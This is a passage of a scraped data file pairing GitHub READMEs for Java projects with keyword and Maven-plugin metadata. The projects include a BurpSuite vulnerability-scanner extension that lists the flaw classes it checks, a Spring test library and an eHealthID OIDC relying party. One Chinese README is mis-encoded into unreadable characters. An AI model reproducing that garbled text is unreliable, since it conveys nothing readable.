",0,2,1,1.0,"['tp', 'antlr', 'download', 'project', 'tutorial', 'window', 'install', 'chocolatey', 'java', 'window', 'retrieve', 'source', 'window', 'compile', 'run', 'window', 'build', 'standalone', 'jar', 'exe', 'ubuntu', 'make', 'maven', 'wrapper', 'executable', 'ubuntu', 'update', 'install', 'java', 'ubuntu', 'retrieve', 'source', 'ubuntu', 'compile', 'run', 'ubuntu', 'build', 'standalone', 'jar', 'exe', 'mac', 'make', 'maven', 'wrapper', 'executable', 'mac', 'install', 'homebrew', 'java', 'mac', 'retrieve', 'source', 'mac', 'compile', 'run', 'mac', 'build', 'standalone', 'jar', 'exe', 'run', 'standalone', 'jar', 'development']","['ubuntu', 'mac', 'window', 'run', 'standalone']",1.0,"[com.akathist.maven.plugins.launch4j:launch4j-maven-plugin,org.antlr:antlr4-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.openjfx:javafx-maven-plugin]",0.0,1.0,0.0
Anof-cyber/AlphaScan,main,"# AlphaScan
A BurpSuite extension for vulnerability Scanning

[![Java Build](https://github.com/Anof-cyber/AlphaScan/actions/workflows/maven.yml/badge.svg)](https://github.com/Anof-cyber/AlphaScan/actions/workflows/maven.yml)

### ğŸš§ Under Development ğŸš§

This project is currently under active development. Not all features are implemented, and the code may not be stable. While contributions are appreciated, please note that I am not currently accepting external contributions.


## Vulnerabilities



###### Version  1.0

| Vulnerability                   | Details                                                                                                             |
|--------------------------------|----------------------------------------------------------------------------------------------------------------------|
| Blind Time Based Injection     | [Payloads](https://github.com/CyberM0nster/SQL-Injection-Payload-List-/blob/master/Generic%20Time%20Based%20SQL%20Injection%20Payloads)                                  |
| AWS SSRF                       | [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-url-for-cloud-instances)                        |
| Reflected XSS                  | [Payloads](https://github.com/Proviesec/xss-payload-list/tree/main)                                                |
| Error Based SQL injection      | [Payload-src-github](https://github.com/payloadbox/sql-injection-payload-list) ([Payload-src-twitter](https://x.com/Fabrikat0r/status/1731784913572200720?)) ([Payload-src-twitter](https://twitter.com/intigriti/status/1727669826338914506)) |
| Forced Browsing | Experimental, likely to be false positive|
| JSON CSRF| Check for Content type text and No Additional headers like bearer|
| JWT Token Expiry | |
| CORS| Check CORS if not check for Common Bypass |
| Verify session cookie or token | Not Part of Active or Passive Scan, Need to be validated before starting a scan through right click menu on any request with a valid session (Not expired) |
| Error Messages and Banner Grab| Passive Scanner for Error message or Server Banner|
| Missing CSP Header             |                                                                                                                      |
| CSP Header with Insecure Directives |                                                                                                                  |
| CSP Header Missing Required Directives |                                                                                                            |
| Missing X-Frame Header         |                                                                                                                      |
| Missing HSTS Header            |                                                                                                                      |
| Check If Request with Body support XML Content Type Header |   Partial/ Could be False Positive, will be updated later |
| Session Identifier (HTTP Only Flag) | Only Available if Session Identifier is found |
| Session Identifier (Secure Flag) | Only Available if Session Identifier is found|


<br>

",0,0,1,0.0,"['alphascan', 'under', 'development', 'vulnerability', 'version']","['alphascan', 'under', 'development', 'vulnerability', 'version']",1.0,"[maven-assembly-plugin,maven-compiler-plugin,maven-jar-plugin,maven-surefire-plugin]",0.0,1.0,0.0
nipafx/modern-java-demo,main,"# Modern Java in Action

A repository for my live-coding talk [Modern Java in Action](https://nipafx.dev/talk-java-action).

Each step is its own commit.
Check them out to see here what needs to be done.
",0,0,1,0.0,"['modern', 'java', 'action']","['modern', 'java', 'action']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-jar-plugin]",0.0,1.0,0.0
wudgaby/wudgaby-platform,master,"# wudgaby-platform

## ä¸»è¦åŠŸèƒ½
è‡ªç”¨æ¡†æ¶ï¼ŒåŒ…å«åŸºç¡€ç»„ä»¶å’Œä¸šåŠ¡ç»„ä»¶.

## ç»„ä»¶
![basis.png](document%2Fres%2Fbasis.png)
![starters.png](document%2Fres%2Fstarters.png)


## å¦‚ä½•æ„å»º
```bat
./install_projects.bat
é€‰æ‹©3æ„å»ºæ•´ä¸ªé¡¹ç›®
```

## å¦‚ä½•ä½¿ç”¨
### å¦‚ä½•å¼•å…¥ä¾èµ–
å¦‚æœéœ€è¦ä½¿ç”¨å·²å‘å¸ƒçš„ç‰ˆæœ¬ï¼Œåœ¨ `dependencyManagement` ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®.
ç„¶ååœ¨ `dependencies` ä¸­æ·»åŠ è‡ªå·±æ‰€éœ€ä½¿ç”¨çš„ä¾èµ–å³å¯ä½¿ç”¨
```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>com.wudgaby.platform</groupId>
            <artifactId>basis-project-dependencies</artifactId>
            <version>latest</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

### å¼•å…¥å•ä¸ªåŒ…
```xml
<dependency>
    <groupId>com.wudgaby.platform</groupId>
    <artifactId>api-version-spring-boot-starter</artifactId>
    <version>latest</version>
</dependency>
```

### SNAPSHOT ç‰ˆæœ¬éœ€åœ¨mavenä¸­åŠ å…¥
```xml
<repositories>
    <repository>
      <id>snapshots-repo</id>
      <url>https://oss.sonatype.org/content/repositories/snapshots</url>
    </repository>
</repositories>
```

## ç‰ˆæœ¬ç®¡ç†è§„èŒƒ

é¡¹ç›®çš„ç‰ˆæœ¬å·æ ¼å¼ä¸º x.x.x çš„å½¢å¼ï¼Œå…¶ä¸­ x çš„æ•°å€¼ç±»å‹ä¸ºæ•°å­—ï¼Œä» 0 å¼€å§‹å–å€¼ï¼Œä¸”ä¸é™äº 0~9 è¿™ä¸ªèŒƒå›´ã€‚é¡¹ç›®å¤„äºå­µåŒ–å™¨é˜¶æ®µæ—¶ï¼Œç¬¬ä¸€ä½ç‰ˆæœ¬å·å›ºå®šä½¿ç”¨ 0ï¼Œå³ç‰ˆæœ¬å·ä¸º 0.x.x çš„æ ¼å¼ã€‚
ç‰ˆæœ¬å·ä¸springbootç‰ˆæœ¬å·é è¿‘

* 1.x.x ç‰ˆæœ¬é€‚ç”¨äº Spring Boot 2.3.x
* 2.x.x ç‰ˆæœ¬é€‚ç”¨äº Spring Boot 2.7.x
* 3.x.x ç‰ˆæœ¬é€‚ç”¨äº Spring Boot 3.x.x

## æ¼”ç¤º Demo
ä¸ºäº†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ï¼Œé¡¹ç›®åŒ…å«äº†ä¸€ä¸ªå­æ¨¡å— `basis-examples`ã€‚æ­¤æ¨¡å—ä¸­æä¾›äº†æ¼”ç¤ºç”¨çš„ example ï¼Œæ‚¨å¯ä»¥é˜…è¯»å¯¹åº”çš„ example å·¥ç¨‹ä¸‹çš„ readme æ–‡æ¡£ï¼Œæ ¹æ®é‡Œé¢çš„æ­¥éª¤æ¥ä½“éªŒã€‚


## FAQ
```
java: You arenâ€™t using a compiler supported by lombok, so lombok will not work and has been disabled.
Your processor is: com.sun.proxy.$Proxy26
Lombok supports: OpenJDK javac, ECJ

è§£å†³åŠæ³•ï¼š
settingsä¸­æœç´¢Compilerï¼Œåœ¨Ideaçš„å…¨å±€é…ç½®Compilerä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š
-Djps.track.ap.dependencies=false
```

## äº¤æµç¾¤
QQ: æš‚æ— 
é’‰é’‰: æš‚æ— 

",0,0,1,0.0,"['snapshot', 'demo', 'faq']","['snapshot', 'demo', 'faq']",156.0,"[com.github.core-lib:xjar-maven-plugin,org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:findbugs-maven-plugin,org.codehaus.mojo:flatten-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.flywaydb:flyway-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,111.0,45.0
microcks/microcks-testcontainers-java-spring-demo,main,"# Microcks Testcontainers Spring Boot Demo

![Microcks Testcontainers Spring demo](./assets/microcks-testcontainers-java-spring-demo.png)

This application is a demonstration on how to integrate Microcks via [Testcontainers]([https://www.testcontainers.com]) within your development inner-loop.

You will work with a Spring Boot application and explore how to:
* Use Microcks for **provisioning third-party API mocks**,
* Use Microcks for **simulating external Kafka events publishers**,
* Write tests using Microcks **contract-testing** features for both **REST/OpenAPI based APIs and Events/AsyncAPI** based messaging

## Table of contents

* [Step 1: Getting Started](step-1-getting-started.md)
* [Step 2: Exploring the app](step-2-exploring-the-app.md)
* [Step 3: Local Development Experience with Microcks](step-3-local-development-experience.md)
* [Step 4: Write Tests for REST](step-4-write-rest-tests.md)
* [Step 5: Write Tests for Async](step-5-write-async-tests.md)

## License Summary

The code in this repository is made available under the MIT license. See the [LICENSE](LICENSE) file for details.
",0,0,5,10.0,"['microcks', 'testcontainers', 'spring', 'boot', 'demo', 'table', 'content', 'license', 'summary']","['microcks', 'testcontainers', 'spring', 'boot', 'demo']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

### Additional materials
* See the online presentation of the project https://www.youtube.com/watch?v=_Vci_5nr8R0 hosted by 
[AtomicJar](https://www.atomicjar.com/), the creators of [TestContainers](https://testcontainers.com/) framework.
* Presentation slides: [Miro board](https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805)

### Known projects using library
<img src=""doc/miro-logo.png"" alt=""Miro"" width=""120""/>

[Miro](https://miro.com/) is using this approach to optimize huge integration test suites and it saved a lot of resource
for CI/CD pipelines.
",3,0,3,6.0,"['improve', 'spring', 'boot', 'test', 'efficiency', 'problem', 'statement', 'propose', 'solution', 'reference', 'limitation', 'support', 'version', 'how', 'use', 'how', 'work', 'additional', 'material', 'know', 'project', 'use', 'library']","['how', 'use', 'improve', 'spring', 'boot']",8.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,6.0,2.0
oviva-ag/ehealthid-relying-party,main,"[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=alert_status&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=coverage&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)

# OpenID Connect Relying Party for GesundheitsID (eHealthID)

The goal is to provide a simple standalone server exposing Germany's 'GesundheitsID' (eHealthID) as
a good old OpenID Connect Relying Party (OIDC RP).

Identity Providers such as Keycloak can link accounts with OIDC out-of-the-box

## Authentication Flow IDP / Relying Party

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    note over app, rp: login via eHealthID handled by Relying Party (RP)
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

## Contents

- [ehealthid-rp](./ehealthid-rp) - A standalone application to act as a OpenID Connect (OIDC)
  Relying Party. Bridges OIDC and Germany's GesundheitsID OpenID federation.
- [ehealthid-cli](./ehealthid-cli) - A script to generate keys and federation registration forms.
- [ehealthid](./ehealthid) - A plain Java library to build RelyingParties for GesundheitsID.
    - API clients
    - Models for the EntityStatments, IDP list endpoints etc.
    - Narrow support for the 'Fachdienst' use-case.

# Quickstart

```shell

#---- 1. generate keys
# the URI where your relying-party will run, 
# for the registration this _MUST_ be publicly reachable
export ISSUER_URI=https://mydiga.example.com

# generate keys for the application, keep those safe and secure
./cli.sh keygen --issuer-uri=$ISSUER_URI

#---- 2. deploy the relying party
docker run --rm \
    -v ""$(pwd)""/sig_mydiga_example_com_jwks.json:/secrets/sig_jwks.json:ro \
    -e ""EHEALTHID_RP_APP_NAME=Awesome DiGA"" \
    -e ""EHEALTHID_RP_BASE_URI=$ISSUER_URI"" \
    -e 'EHEALTHID_RP_FEDERATION_ES_JWKS_PATH=/secrets/sig_jwks.json' \
    -e 'EHEALTHID_RP_FEDERATION_MASTER=https://app-test.federationmaster.de' \
    -e 'EHEALTHID_RP_REDIRECT_URIS=https://sso-mydiga.example.com/auth/callback' \
    -e 'EHEALTHID_RP_ES_TTL=PT5M' \
    -e 'EHEALTHID_RP_IDP_DISCOVERY_URI=https://sso-mydiga.example.com/.well-known/openid-configuration' \
    -p 1234:1234 \
    ghcr.io/oviva-ag/ehealthid-relying-party:latest

#---- 3. register with the federation master

# a string received from Gematik as part of the registration process
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
export MEMBER_ID=FDmyDiGa0112TU

# generate the registration XML from an existing entity statement
./cli.sh fedreg \
    --environment=TU \
    --contact-email=bobby.tables@example.com \
    --issuer-uri=$ISSUER_URI \
    --member-id=""$MEMBER_ID""
    
# this prints the XML for registration in the federation, send it
# as an email attachment to Gematik 
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.
![](./keycloak_config.png)

# Configuration

Use environment variables to configure the relying party server.

(*) required configuration

| Name                                     | Description                                                                                                                                       | Example                                                           |
|------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------|
| `EHEALTHID_RP_FEDERATION_ES_JWKS_PATH`*  | Path to a JWKS with at least one keypair for signature of the entity statement. All these keys __MUST__ be registered with the federation master. | `./sig_jwks.json`                                                 |
| `EHEALTHID_RP_REDIRECT_URIS`*            | Valid redirection URIs for OpenID connect.                                                                                                        | `https://sso-mydiga.example.com/auth/callback`                    |
| `EHEALTHID_RP_BASE_URI`*                 | The external base URI of the relying party. This is also the `issuer` towards the OpenID federation. Additional paths are unsupported for now.    | `https://mydiga-rp.example.com`                                   |
| `EHEALTHID_RP_IDP_DISCOVERY_URI`*        | The URI of the discovery document of your identity provider. Used to fetch public keys for client authentication.                                 | `https://sso-mydiga.example.com/.well-known/openid-configuration` |
| `EHEALTHID_RP_FEDERATION_MASTER`*        | The URI of the federation master.                                                                                                                 | `https://app-test.federationmaster.de`                            |
| `EHEALTHID_RP_APP_NAME`*                 | The application name within the federation.                                                                                                       | `Awesome DiGA`                                                    |
| `EHEALTHID_RP_HOST`                      | Host to bind to.                                                                                                                                  | `0.0.0.0`                                                         |
| `EHEALTHID_RP_PORT`                      | Port to bind to.                                                                                                                                  | `1234`                                                            |
| `EHEALTHID_RP_ES_TTL`                    | The time to live for the entity statement. In ISO8601 format.                                                                                     | `PT12H`                                                           |
| `EHEALTHID_RP_SCOPES`                    | The comma separated list of scopes requested in the federation. This __MUST__ match what was registered with the federation master.               | `openid,urn:telematik:versicherter`                               |
| `EHEALTHID_RP_SESSION_STORE_TTL`         | The time to live for sessions. In ISO8601 format.                                                                                                 | `PT20M`                                                           |
| `EHEALTHID_RP_SESSION_STORE_MAX_ENTRIES` | The maximum number of sessions to store. Keeps memory bounded.                                                                                    | `1000`                                                            |
| `EHEALTHID_RP_CODE_STORE_TTL`            | The time to live for codes, i.e. successful logins where the code is not redeemed yet. In ISO8601 format.                                         | `PT5M`                                                            |
| `EHEALTHID_RP_CODE_STORE_MAX_ENTRIES`    | The maximum number of codes to store. Keeps memory bounded.                                                                                       | `1000`                                                            |
| `EHEALTHID_RP_LOG_LEVEL`                 | The log level.                                                                                                                                    | `INFO`                                                            |

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    participant secIdp as Sectoral IDP
    participant fedmaster as Federation Master
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    alt relying party & eHealthID federation
        rp ->> fedmaster: fetch list of sectoral IDPs
        fedmaster -->> rp: list of sectoral IDPs
        rp -->> app: show list of IDPs to select from
        app ->> rp: select an IDP
        rp ->> secIdp: get redirect url (PAR)
        secIdp -->> rp: redirect_uri
        rp -->> app: redirect to sectoral authentication (e.g. ident app)
        alt proprietary flow
            app ->> secIdp: authenticate
            secIdp ->> app: success, redirect to relying party
        end
        app ->> rp: success, callback to relying party
        rp ->> secIdp: fetch id_token
        secIdp -->> rp: id_token
    end
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    alt client authentication
        note right of rp: client authenticated via 'private_key_jwt'
        rp ->> idp: fetch OpenID discovery document
        idp -->> rp: discovery document
        rp ->> idp: fetch JWKS
        idp -->> rp: JWKS
        note right of rp: verifies client JWT with discovered JWKS
    end
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

# Helpful Links

- [OpenID Federation Spec](https://openid.net/specs/openid-federation-1_0.html)
- [Gematik Fachdienst Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FD/latest/)
- [Gematik Fedmaster Specification](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FedMaster/latest/)
- [Gematik Sectoral IDP Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_Sek/latest/)
- [AppFlow - Authentication flow to implement](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster)
- [Sektoraler IDP - Examples & Reference Implementation](https://wiki.gematik.de/display/IDPKB/Sektoraler+IDP+-+Referenzimplementierung+und+Beispiele)
",15,4,36,60.0,"['openid', 'connect', 'relying', 'party', 'gesundheitsid', 'ehealthid', 'authentication', 'flow', 'idp', 'relying', 'party', 'content', 'quickstart', 'uri', 'run', 'registration', 'publicly', 'reachable', 'generate', 'key', 'application', 'keep', 'safe', 'secure', 'string', 'receive', 'gematik', 'part', 'registration', 'process', 'see', 'http', 'generate', 'registration', 'xml', 'exist', 'entity', 'statement', 'print', 'xml', 'registration', 'federation', 'send', 'email', 'attachment', 'gematik', 'see', 'http', 'configure', 'identity', 'provider', 'example', 'keycloak', 'openid', 'connect', 'identity', 'provider', 'setting', 'configuration', 'generate', 'key', 'register', 'federation', 'authentication', 'flow', 'involve', 'party', 'test', 'limitation', 'open', 'point', 'wishlist', 'helpful', 'link']","['registration', 'party', 'generate', 'openid', 'connect']",5.0,"[com.diffplug.spotless:spotless-maven-plugin,maven-assembly-plugin,maven-dependency-plugin,maven-site-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin]",0.0,4.0,1.0
vishalmysore/Tools4AI,main,"<div align=""center"">
  <a href=""https://www.linkedin.com/posts/vishalrow_ai-appdevelopment-actions-activity-7171302152101900288-64qg?utm_source=share&utm_medium=member_desktop"">
    <img src=""tools4ai.png""  width=""200"" height=""200"">
  </a>
</div>
<p align=""center"">
    <img  src=""https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fvishalmysore%2Ftools4ai&countColor=black&style=flat%22"">
    <a target=""_blank"" href=""https://github.com/vishalmyore/tools4ai""><img src=""https://img.shields.io/github/stars/vishalmysore/tools4ai?color=black"" /></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=alert_status""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=bugs""/></a>
